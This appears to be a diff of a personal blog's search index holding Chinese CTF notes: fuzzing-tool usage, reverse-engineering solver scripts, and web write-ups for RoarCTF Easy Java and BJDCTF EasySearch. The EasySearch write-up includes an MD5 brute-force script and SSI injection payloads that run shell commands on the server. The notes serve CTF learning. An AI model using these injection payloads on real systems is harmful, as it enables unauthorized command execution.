@@ -2,7 +2,7 @@
 <search>
   <entry>
     <title>工具杂记</title>
-    <url>/Learning/%E5%B7%A5%E5%85%B7%E6%9D%82%E8%AE%B0/</url>
+    <url>/CTF/%E5%B7%A5%E5%85%B7%E6%9D%82%E8%AE%B0/</url>
     <content><![CDATA[<h1 id="wfuzz爆破"><a href="#wfuzz爆破" class="headerlink" title="wfuzz爆破"></a>wfuzz爆破</h1><p>渗透测试工具，对目标不同参数进行模糊测试</p>
 <h4 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -c -z payload,range_start-range_end http://target.com/FUZZ</span><br></pre></td></tr></table></figure></div>
 
@@ -12,9 +12,9 @@
 <li><code>--hc 404,403</code> 用来隐藏特定的状态码</li>
 </ul>
 <p><strong>Kali自带，输入wfuzz有使用方法</strong></p>
-<p><img lazyload src="/images/loading.svg" data-src="/images/wfuzz00.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/images/wfuzz00.png"></p>
 <p><code>wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt --hc 404,403 http://192.168.47.157/~FUZZ</code></p>
-<p><img lazyload src="/images/loading.svg" data-src="/images/wfuzz01.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/CTF/images/wfuzz01.png"></p>
 <h4 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h4><p><a class="link" href="https://blog.csdn.net/Amoy6228/article/details/134570129">https://blog.csdn.net/Amoy6228/article/details/134570129 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <h1 id="fuff爆破"><a href="#fuff爆破" class="headerlink" title="fuff爆破"></a>fuff爆破</h1><h4 id="基本语法："><a href="#基本语法：" class="headerlink" title="基本语法："></a>基本语法：</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">格式：ffuf -u 目标地址/FUZZ -w 字典</span><br><span class="line">举例：ffuf -u http://192.168.111.131/FUZZ -w /usr/share/SecLists-2022.2/Discovery/Web-Content/common.txt</span><br></pre></td></tr></table></figure></div>
 
@@ -462,94 +462,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Re刷题记录</title>
-    <url>/CTF/Re/Re%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<h2 id="Buu-新年快乐-初用upx"><a href="#Buu-新年快乐-初用upx" class="headerlink" title="Buu - 新年快乐 [ 初用upx ]"></a>Buu - 新年快乐 [ 初用upx ]</h2><p>32位有壳</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-4-00.png"></p>
-<blockquote>
-<p>加壳 upx.exe filename</p>
-<p>脱壳 upx.exe -d filename</p>
-</blockquote>
-<p><strong>在upx目录下打开终端，将软件放在相同目录（或者直接给出绝对路径）</strong></p>
-<p>脱完壳之后用32位ida打开，进入main函数，</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-4-01.png"></p>
-<p>str2就是flag</p>
-<h2 id="Buu-xor-ida运用"><a href="#Buu-xor-ida运用" class="headerlink" title="Buu - xor [ ida运用 ]"></a>Buu - xor [ ida运用 ]</h2><p>查壳，无壳，拖进64位ida（我是在linux中file命令看的位）</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-00.png"></p>
-<blockquote>
-<p>这是main函数，先看到</p>
-<p> if ( !strncmp(__b, global, 33uLL) )<br>    printf(“Success”);</p>
-<p>要success &#x3D;&gt; __b &#x3D;&#x3D; global 前33位相等</p>
-</blockquote>
-<blockquote>
-<p>全部分析一遍，先给__b 256字节置0 -&gt; 调用get_line函数 -&gt; 输入__b -&gt; __b字符串的长度只能是33 -&gt; 然后是for循环，一个异或</p>
-<p>-&gt; 最后比较，前33位要相等</p>
-</blockquote>
-<p><strong>Result</strong>： global[i] &#x3D; b[i] ^ b[i-1]，我们要求的是__b的值（前面的printf语句，input your flag），可以看出长度为33（如果不是33，直接goto LABEL_7 &#x3D;&gt; return语句）</p>
-<p><strong>Skill</strong>：点击global查看它的值，跳转到上面这个图中，看到灰色的部分（我奇怪的是，与Wp中看到的值不一样，我就随便双击了一下灰色部分，发现依然可以跳转），然后就来到了下面这个图的部分</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-01.png"></p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">shift + e =&gt; 提取数组中的字符</span><br></pre></td></tr></table></figure></div>
-
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-02.png" alt="4-5-02"></p>
-<p>脚本异或一下得到__b的值</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">data = [</span><br><span class="line">  <span class="number">102</span>,  <span class="number">10</span>, <span class="number">107</span>,  <span class="number">12</span>, <span class="number">119</span>,  <span class="number">38</span>,  <span class="number">79</span>,  <span class="number">46</span>,  <span class="number">64</span>,  <span class="number">17</span>,</span><br><span class="line">  <span class="number">120</span>,  <span class="number">13</span>,  <span class="number">90</span>,  <span class="number">59</span>,  <span class="number">85</span>,  <span class="number">17</span>, <span class="number">112</span>,  <span class="number">25</span>,  <span class="number">70</span>,  <span class="number">31</span>,</span><br><span class="line">  <span class="number">118</span>,  <span class="number">34</span>,  <span class="number">77</span>,  <span class="number">35</span>,  <span class="number">68</span>,  <span class="number">14</span>, <span class="number">103</span>,   <span class="number">6</span>, <span class="number">104</span>,  <span class="number">15</span>,</span><br><span class="line">   <span class="number">71</span>,  <span class="number">50</span>,  <span class="number">79</span>,  <span class="number">0</span></span><br><span class="line">]</span><br><span class="line">x = <span class="string">&quot;f&quot;</span>  <span class="comment"># for循环是从1开始的</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(data)):</span><br><span class="line">    x += <span class="built_in">chr</span>(data[i]^data[i-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="Buu-reverse3-base64加密函数"><a href="#Buu-reverse3-base64加密函数" class="headerlink" title="Buu - reverse3 [ base64加密函数 ]"></a>Buu - reverse3 [ base64加密函数 ]</h2><p>32位无壳，拖进ida32位中，找到main_0函数</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-03.png"></p>
-<p>输入字符串 Str -&gt; 经过sub_4110BE函数之后赋值给v4 -&gt; 将v4前40位字符给Destination -&gt; 遍历Destination字符串 每一个加上下表-&gt; 比较Destination 和 Str2是否相同</p>
-<blockquote>
-<p>sub_4110BE函数</p>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-04.png"></p>
-<p>-&gt; 下面这是一个base64加密的过程（Wp）</p>
-<p><strong>Result：</strong>可以查看Str2字符串值（追踪Str2），推出来输入的值（先base64加密 后每一位加上下标）</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-5-05.png"></p>
-<p><strong>payload：</strong></p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data = <span class="string">&quot;e3nifIH9b_C@n@dH&quot;</span></span><br><span class="line">str1 = <span class="string">&quot;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    str1 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(data[i]) - i)</span><br><span class="line">flag = base64.b64decode(str1)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="Buu-不一样的flag-迷宫题"><a href="#Buu-不一样的flag-迷宫题" class="headerlink" title="Buu - 不一样的flag [ 迷宫题 ]"></a>Buu - 不一样的flag [ 迷宫题 ]</h2><p>32位无壳，用ida打开，看到一串数字和上下左右（猜测是迷宫题）</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-6-00.png"></p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-6-01.png"></p>
-<p>选中 <code>&#39;49&#39;</code>换成字符 -&gt; R键将Ascii换成对应字符</p>
-<p>-&gt; 如果是1 就退出</p>
-<p>-&gt; 如果是# 你输入的序列就是flag</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">*1111</span><br><span class="line">01000</span><br><span class="line">01010</span><br><span class="line">00010</span><br><span class="line">1111#</span><br><span class="line">下下下右右上上右右下下下</span><br><span class="line">222441144222</span><br></pre></td></tr></table></figure></div>
-
-<blockquote>
-<p>5*5列，从*开始，1,2,3,4对应上下左右 走到#</p>
-</blockquote>
-<h2 id="Buu-SimpleRev-字节序-真是逆向了"><a href="#Buu-SimpleRev-字节序-真是逆向了" class="headerlink" title="Buu - SimpleRev [ 字节序 真是逆向了 ]"></a>Buu - SimpleRev [ 字节序 真是逆向了 ]</h2><p>字节的排列方式有两个通用规则： <a class="link" href="https://www.ruanyifeng.com/blog/2022/06/endianness-analysis.html">学习了解字节序00 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>                    <a class="link" href="https://www.ruanyifeng.com/blog/2016/11/byte-order.html">学习了解字节序01 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><strong>大端序</strong> - 数据的低位字节放在内存的高位地址，高位字节存放在低位地址</p>
-<p><strong>小端序</strong> - 低位放在低地址，高位放在高地址</p>
-<p><strong>CPU读取内存中的数据时，是从低地址向高地址方向进行读取的</strong></p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-6-02.png"></p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i ) <span class="comment">// v5是key的长度</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( key[v3 % v5] &gt; <span class="string">&#x27;@&#x27;</span> &amp;&amp; key[v3 % v5] &lt;= <span class="string">&#x27;Z&#x27;</span> ) <span class="comment">// 判断key中的每个元素是不是大写字母</span></span><br><span class="line">    key[i] = key[v3 % v5] + <span class="number">32</span>;	<span class="comment">// 如果是，将那一位 加上32 =&gt; 变成对应的小写字母</span></span><br><span class="line">  ++v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">96</span> || v1 &gt; <span class="number">122</span> )	<span class="comment">// 小写字母范围</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">64</span> &amp;&amp; v1 &lt;= <span class="number">90</span> ) <span class="comment">// 大写字母范围</span></span><br><span class="line">    &#123;</span><br><span class="line">      str2[v2] = (v1 - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>; <span class="comment">// 下面这些就有点懵逼了了</span></span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    str2[v2] = (v1 - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">    ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !(v3 % v5) )</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">32</span>);</span><br><span class="line">  ++v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<blockquote>
-<p>还要对Ascii码熟悉点</p>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Re/Re%E8%AE%B0%E5%BD%95/4-6-03.png"></p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">text = <span class="string">&quot;killshadow&quot;</span></span><br><span class="line">key = <span class="string">&quot;adsfkndcls&quot;</span></span><br><span class="line">dic = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>((<span class="built_in">ord</span>(j) - <span class="number">39</span> - <span class="built_in">ord</span>(key[i]) + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>) == text[i]:</span><br><span class="line">            flag += j</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="GXYCTF2019-luck-guy"><a href="#GXYCTF2019-luck-guy" class="headerlink" title="[GXYCTF2019]luck_guy"></a>[GXYCTF2019]luck_guy</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        s = <span class="number">9180147350284624745LL</span>;</span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">strcat</span>(&amp;f2, (<span class="type">const</span> <span class="type">char</span> *)&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( j % <span class="number">2</span> == <span class="number">1</span> )</span><br><span class="line">            *(&amp;f2 + j) -= <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            --*(&amp;f2 + j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;OK, it&#x27;s flag:&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x28</span>uLL);</span><br><span class="line">        <span class="built_in">strcat</span>((<span class="type">char</span> *)&amp;s, f1);</span><br><span class="line">        <span class="built_in">strcat</span>((<span class="type">char</span> *)&amp;s, &amp;f2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></div>
-
-<blockquote>
-<p>case4：将s字符串赋值给f2</p>
-<p>case5：对于f2字符串，如果是奇数位 -2；如果是偶数位 -1</p>
-<p>case1：f1已知，f2是上面得到的，两个拼接 就是s</p>
-</blockquote>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">f1 = <span class="string">&quot;GXY&#123;do_not_&quot;</span></span><br><span class="line"></span><br><span class="line">key = [<span class="number">0x7f</span>, <span class="number">0x66</span>, <span class="number">0x6f</span>, <span class="number">0x60</span>, <span class="number">0x67</span>, <span class="number">0x75</span>, <span class="number">0x63</span>, <span class="number">0x69</span>][::-<span class="number">1</span>] <span class="comment">#逆序 [ 字节序 小端序 ]</span></span><br><span class="line"><span class="comment"># 0x7F666F6067756369</span></span><br><span class="line">flag = f1</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(key)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(key[i] - <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(key[i] - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
-]]></content>
-      <categories>
-        <category>Reverse</category>
-      </categories>
-      <tags>
-        <tag>Reverse</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>BUU-[RoarCTF 2019]Easy Java的Wp</title>
     <url>/CTF/Web/BUU-Easy_Java/</url>
     <content><![CDATA[<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><strong>WEB-INF是Java的WEB应用的安全目录,此外想在页面访问WEB-INF应用里面的文件,必须要通过web.xml进行相应的映射才能访问</strong></p>
@@ -577,74 +489,6 @@
 <p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-Easy_Java/04.png"></p>
 <p>再访问下载WEB-INF&#x2F;classes&#x2F;com&#x2F;vm&#x2F;ctf&#x2F;FlagController.class</p>
 <p>打开之后发现一串base64编码的字符串，解码得到flag.</p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>Buu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BUU-[BJDCTF2020]EasySearch的Wp</title>
-    <url>/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/</url>
-    <content><![CDATA[<h4 id="知识点（参考别人的文章）："><a href="#知识点（参考别人的文章）：" class="headerlink" title="知识点（参考别人的文章）："></a>知识点（参考别人的文章）：</h4><ul>
-<li><input disabled type="checkbox"> 1.<a class="link" href="https://blog.csdn.net/qq_46145027/article/details/122174063">目录扫描 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
-<li><input disabled type="checkbox"> 2.代码审计</li>
-<li><input disabled type="checkbox"> 3.<a class="link" href="https://blog.csdn.net/cnds123/article/details/125962911">shtml <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
-</ul>
-<h4 id="1-目录扫描"><a href="#1-目录扫描" class="headerlink" title="1.目录扫描"></a>1.目录扫描</h4><p><code>python dirsearch.py -u &quot;URL&quot; -W ./db/字典名字</code></p>
-<h4 id="2-代码审计"><a href="#2-代码审计" class="headerlink" title="2.代码审计"></a>2.代码审计</h4><p><code>header(&quot;Content-Type: text/html;charset=utf-8&quot;);</code></p>
-<p>-&gt; 设置HTTP响应头的一种方式，header函数必须在发送任何实际输出（如HTML内容）之前调用，以确保设置的响应头生效,通常在PHP脚本开头</p>
-<p><code>mt_rand(0,73)</code></p>
-<p>-&gt;使用 Mersenne Twister 算法，在0-73这个范围内随机生成一个整数</p>
-<h4 id="3-shtml"><a href="#3-shtml" class="headerlink" title="3.shtml"></a>3.shtml</h4><p>后缀名是.shtml，和html一样都是网页文件。不同在于：</p>
-<p>-&gt;shtml文件中有<strong>服务器端包含（server-side includes, SSI）指令</strong></p>
-<p>-&gt;shtml文件在发送到客户端前，会经过服务器进行处理 — <strong>将shtml文件中的SSI指令解释</strong></p>
-<p>-&gt;最终返回给客户端的是<strong>解释过后的shtml文件内容</strong></p>
-<p><strong>SSI指令格式</strong></p>
-<p><code>&lt;!--#include virtual=&quot;文件名字&quot;--&gt;</code></p>
-<p><code>&lt;!--#include file=&quot;文件名字&quot;--&gt; </code> </p>
-<p>-&gt;<code>#include</code>在html文件中引入另一个文件的内容</p>
-<p>-&gt; file 是相对于本文档的位置      virtual 是相对于服务器根目录的位置</p>
-<p><code>&lt;!--#echo var=&quot;变量名称&quot;--&gt;</code> </p>
-<p>-&gt;<code>#echo</code>将 变量或代码 插入到页面中</p>
-<p><strong>注意：&lt;!–与#号间无空格，只有SSI指令与参数间存在空格，SSI指令是大小写敏感的。</strong></p>
-<p><strong>注意：服务器必须配置为支持SSI功能。SHTML文件可能需要在服务器上启用SSI才能发挥作用。</strong></p>
-<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>根据题目名 EasySearch 选择用dirsearch扫描目录，不过我自己什么都没扫出来，看Wp说是 index.php.swp，需要自己将这个添加到字典中，才可以扫出来</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/00.png"></p>
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line">		<span class="variable">$random</span> = <span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line"></span><br><span class="line">		<span class="variable">$content</span> = <span class="title function_ invoke__">uniqid</span>().<span class="variable">$random</span>;    </span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">sha1</span>(<span class="variable">$content</span>); </span><br><span class="line">	&#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.<span class="title function_ invoke__">get_hash</span>().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">			***&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br></pre></td></tr></table></figure></div>
-
-<blockquote>
-<p>1.get_hash函数</p>
-<p>-&gt;$chars是大小写字母+数字+一些特殊符号，$random是$chars中五个随机字符，$content是一段唯一字符串+$random</p>
-<p>-&gt;返回是经过sha1加密的字符串</p>
-<p>2.if else语句可以发现</p>
-<p>-&gt;如果满足$admin &#x3D;&#x3D; substr(md5($_POST[‘password’]),0,6) 会进入if语句  否则直接输出 [!] Failed</p>
-<p>-&gt;显然要满足 脚本编写（跟Wp写的，自己学习一下）</p>
-<p>3.进入if语句之后，会向$shtml中写入$text的内容</p>
-</blockquote>
-<p>首先要通过脚本找到满足if的条件</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000000</span>):</span><br><span class="line">    <span class="keyword">if</span> md5(<span class="built_in">str</span>(i).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()[:<span class="number">6</span>] == <span class="string">&#x27;6d0bc1&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure></div>
-
-<p>成功进入</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/01.png"></p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/02.png"></p>
-<p>输出了 [!] Header error …</p>
-<p>我们是向一个文件中写入了内容，并且我们了解到了shtml的知识，很明显，我们要找到这个写入内容的shtml文件的目录，从而访问</p>
-<p>最后在F12网络中可以找到</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/03.png"></p>
-<p>访问之后</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/04.png" alt="04"></p>
-<p>得到$username就是我们的执行点 再根据shtml的知识，通过SSI指令来控制内容</p>
-<p><code>&lt;!--#exec cmd=&quot;ls&quot;-&gt;</code></p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/05.png"></p>
-<p>查看当前目录并没有什么收获，但我们当前目录是 public 所以我们查看上一级目录</p>
-<p><code>&lt;!--#exec cmd=&quot;ls ../&quot;-&gt;</code></p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/06.png"></p>
-<p>直接访问</p>
-<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/07.png"></p>
 ]]></content>
       <categories>
         <category>Web</category>
@@ -1308,6 +1152,74 @@
       </tags>
   </entry>
   <entry>
+    <title>BUU-[BJDCTF2020]EasySearch的Wp</title>
+    <url>/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/</url>
+    <content><![CDATA[<h4 id="知识点（参考别人的文章）："><a href="#知识点（参考别人的文章）：" class="headerlink" title="知识点（参考别人的文章）："></a>知识点（参考别人的文章）：</h4><ul>
+<li><input disabled type="checkbox"> 1.<a class="link" href="https://blog.csdn.net/qq_46145027/article/details/122174063">目录扫描 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><input disabled type="checkbox"> 2.代码审计</li>
+<li><input disabled type="checkbox"> 3.<a class="link" href="https://blog.csdn.net/cnds123/article/details/125962911">shtml <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+<h4 id="1-目录扫描"><a href="#1-目录扫描" class="headerlink" title="1.目录扫描"></a>1.目录扫描</h4><p><code>python dirsearch.py -u &quot;URL&quot; -W ./db/字典名字</code></p>
+<h4 id="2-代码审计"><a href="#2-代码审计" class="headerlink" title="2.代码审计"></a>2.代码审计</h4><p><code>header(&quot;Content-Type: text/html;charset=utf-8&quot;);</code></p>
+<p>-&gt; 设置HTTP响应头的一种方式，header函数必须在发送任何实际输出（如HTML内容）之前调用，以确保设置的响应头生效,通常在PHP脚本开头</p>
+<p><code>mt_rand(0,73)</code></p>
+<p>-&gt;使用 Mersenne Twister 算法，在0-73这个范围内随机生成一个整数</p>
